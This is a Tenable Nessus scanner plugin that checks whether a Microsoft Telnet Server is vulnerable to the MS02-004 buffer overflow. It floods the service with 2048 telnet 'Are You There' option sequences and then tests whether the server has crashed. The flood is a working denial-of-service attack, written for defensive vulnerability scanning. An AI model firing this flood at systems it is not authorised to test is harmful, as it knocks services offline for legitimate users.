#
# (C) Tenable Network Security, Inc.
#

# This plugin is a derivative of teso_telnet.nasl by Pavel Kankovsky, DCIT s.r.o. <kan@dcit.cz>

include("compat.inc");

if (description)
{
  script_id(11314);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2014/07/11 21:44:07 $");

  script_cve_id("CVE-2002-0020");
  script_bugtraq_id(4061);
  script_osvdb_id(2043);
  script_xref(name:"MSFT", value:"MS02-004");

  script_name(english:"MS02-004: Microsoft Telnet Server Protocol Option Handling Remote Overflow (307298) (intrusive check)");
  script_summary(english:"Attempts to overflow the Telnet server buffer");

  script_set_attribute(attribute:"synopsis", value:
"The remote telnet server is affected by a remote buffer overflow
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote telnet server appears to be Microsoft's telnet server. It
is possible to crash the remote service when it receives too many
options, probably because of a buffer overflow.

An attacker may use this flaw to deny service to legitimate users, or
execute arbitrary code on the remote host subject to the privileges of
the telnet service.");
  script_set_attribute(attribute:"see_also", value:"http://technet.microsoft.com/en-us/security/bulletin/ms02-004");
  script_set_attribute(attribute:"solution", value:"Apply update referenced in MS02-004.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:U/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");

  script_set_attribute(attribute:"vuln_publication_date", value:"2002/02/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2003/03/03");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/o:microsoft:windows");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:microsoft:interix");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2003-2014 Tenable Network Security, Inc.");
  script_family(english:"Windows");

  script_dependencie("find_service1.nasl");
  script_require_keys("Settings/ParanoidReport");
  script_require_ports("Services/telnet", 23);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include('telnet_func.inc');

if (report_paranoia < 2) audit(AUDIT_PARANOID);

#
# The script code starts here.
#

iac_ayt = raw_string(0xff, 0xf6);
iac_ao  = raw_string(0xff, 0xf5);
iac_will_naol = raw_string(0xff, 0xfb, 0x08);
iac_will_encr = raw_string(0xff, 0xfb, 0x26);

#
# This helper function counts AYT responses in the input stream.
# The input is read until 1. the expected number of responses is found,
# or 2. EOF or read timeout occurs.
#
# At this moment, any occurence of "Yes" or "yes" is supposed to be such
# a response. Of course, this is wrong: some FreeBSD was observed to react
# with "load: 0.12  cmd: .log 20264 [running] 0.00u 0.00s 0% 620k"
# when the telnet negotiation have been completed. Unfortunately, adding
# another pattern to this code would be too painful (hence the negotiation
# tricks in attack()).
#
# In order to avoid an infinite loop (when testing a host that generates
# lots of junk, intentionally or unintentionally), I stop when I have read
# more than 100 * max bytes.
#
# Please note builtin functions like ereg() or egrep() cannot be used
# here (easily) because they choke on '\0' and many telnet servers send
# this character
#
# Local variables: num, state, bytes, a, i, newstate
#

function count_ayt(sock, max) {
  local_var num, state, bytes, a, i, newstate;
  num = 0; state = 0;
  bytes = 100 * max;
  while (bytes >= 0) {
    a = recv(socket:sock, length:1024);
    if (!a) return (num);
    bytes = bytes - strlen(a);
    for (i = 0; i < strlen(a); i = i + 1) {
      newstate = 0;
      if ((state == 0) && ((a[i] == "y") || (a[i] == "Y")))
        newstate = 1;
      if ((state == 1) && (a[i] == "e"))
        newstate = 2;
      if ((state == 2) && (a[i] == "s")) {
        # DEBUG display("hit ", a[i-2], a[i-1], a[i], "\n");
        num = num + 1;
        if (num >= max) return (num);
        newstate = 0;
      }
      state = newstate;
    }
  }
  # inconclusive result
  return (-1);
}

#
# This functions tests the vulnerability. "negotiate" indicates whether
# full telnet negotiation should be performed using telnet_init().
# Some targets might need it while others, like FreeBSD, fail to respond
# to AYT in an expected way when the negotiation is done (cf. comments
# accompanying count_ayt()).
#
# Local variables: r, total, size, bomb, succ
#

function attack(port, negotiate) {
  local_var r, total, size, bomb, soc, succ;
  succ = 0;
  soc = open_sock_tcp(port);
  if (!soc) return (0);
  if (negotiate)
    # standard negotiation
    r = telnet_negotiate(socket:soc);
  else {
    # wierd BSD magic, is is necessary?
    send(socket:soc, data:iac_will_naol);
    send(socket:soc, data:iac_will_encr);
    r = 1;
  }
  if (r) {
    # test whether the server talks to us at all
    # and whether AYT is supported
    send(socket:soc, data:iac_ayt);
    r = count_ayt(sock:soc, max:1);
    # DEBUG display("probe ", r, "\n");
    if (r >= 1) {
      # test whether too many AYT's make the server die
      total = 2048; size = total * strlen(iac_ayt);
      bomb = iac_ao + crap(length:size, data:iac_ayt);
      send(socket:soc, data:bomb);
      r = count_ayt(sock:soc, max:total);
      # DEBUG
#display("attack ", r, " expected ", total, "\n");
      if ((r >= 0) && (r < total)) succ = 1;
    }
  }
  close(soc);
  return (succ);
}

#
# The main program.
#

port = get_kb_item("Services/telnet");
if (!port) port = 23;

if (get_port_state(port)) {
  success = attack(port:port, negotiate:0);
  if (!success) success = attack(port:port, negotiate:1);
  if (success) {
  	sleep(5);
  	soc = open_sock_tcp(port);
	if(!soc)security_hole(port);
	}
}

